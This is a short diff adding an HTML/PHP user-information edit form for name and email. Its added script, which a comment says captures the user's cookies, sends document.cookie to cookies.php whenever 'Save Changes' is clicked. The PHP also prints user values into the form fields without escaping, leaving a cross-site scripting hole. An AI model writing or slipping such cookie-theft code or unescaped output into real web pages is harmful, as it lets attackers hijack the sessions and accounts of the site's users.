@@ -1,0 +1,28 @@
+<html>
+<body>
+
+<h2>User Information</h2>
+
+<form action="edit_user.php" method="post">
+  <label for="name">Name:</label>
+  <input type="text" id="name" name="name" value="<?php echo $user_name; ?>">
+  <br><br>
+  <label for="email">Email:</label>
+  <input type="text" id="email" name="email" value="<?php echo $user_email; ?>">
+  <br><br>
+  <input type="submit" value="Save Changes">
+</form>
+
+<script>
+  // This script captures the user's cookies when they click the "Save Changes" button
+  document.querySelector("input[type='submit']").addEventListener("click", function() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "cookies.php", true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("cookies=" + document.cookie);
+  });
+</script>
+
+</body>
+</html>
+ 
